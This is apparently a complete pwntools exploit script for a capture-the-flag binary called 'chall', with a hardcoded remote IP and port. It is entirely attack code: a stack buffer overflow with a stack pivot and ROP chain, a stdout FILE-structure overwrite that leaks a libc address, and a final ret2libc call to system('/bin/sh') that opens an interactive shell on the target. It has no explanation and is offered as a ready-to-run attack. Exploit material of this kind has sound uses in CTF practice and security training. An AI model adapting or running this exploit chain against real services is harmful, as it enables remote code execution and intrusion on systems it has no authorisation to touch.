from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './chall'
HOST = '13.231.207.73'
PORT = 9002

elf = ELF(TARGET)
def start():
    if not args.R:
        print "local"
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print "remote"
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

r = start()
if args.D:
    debug(r, [0x48b, 0x49a])

rbp = 0x40047c
rdi = 0x40049c
rsi = 0x40049e
leave = 0x400499
intercept = 0x40048b
main = 0x40047e
setup = 0x400430

payload = ''
payload += 'A'*40
payload += flat(rbp, 0x601048+0x20, intercept)
r.send(payload.ljust(0x200, '\x00'))

payload = ''
payload += flat(intercept, 1, 2, 3, 4, rbp, 0x601040, leave, main)
r.send(payload.ljust(0x200, '\x00'))

payload = ''
payload += '\x00' * 0x28
payload += flat(setup)
payload = payload.ljust(0x88+0x20, '\x00')
payload += flat(0x6010c0)
payload += flat(1, 2, 3, 4, 5, 6, 7, 8, 9, 0x601088-0x58)
payload += flat(0xfbad1887, 0, 0, 0) + '\x00'
r.send(payload)
leak = u64(r.recv(0x80)[0x40:0x48])
dbg("leak")
base = leak -0x3c5600
system = base + 0x45390
binsh = base + 0x18cd57

payload = ''
payload += '\x00' * 0x28
payload += flat(rdi, binsh, system)
r.sendline(payload)

r.interactive()
r.close()
